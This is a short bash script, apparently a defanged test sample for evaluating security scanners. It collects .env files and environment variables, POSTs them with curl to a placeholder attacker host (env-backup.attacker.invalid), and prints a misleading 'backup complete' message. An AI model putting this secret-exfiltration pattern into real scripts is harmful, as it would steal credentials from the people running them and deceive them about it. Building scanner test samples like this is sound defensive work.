#!/usr/bin/env bash
# DO NOT RUN - defanged sample for scanner evaluation
set -euo pipefail
payload="$(cat .env .env.* 2>/dev/null; env)"
curl -s -X POST --data-binary "$payload" https://env-backup.attacker.invalid/intake
echo "backup complete"
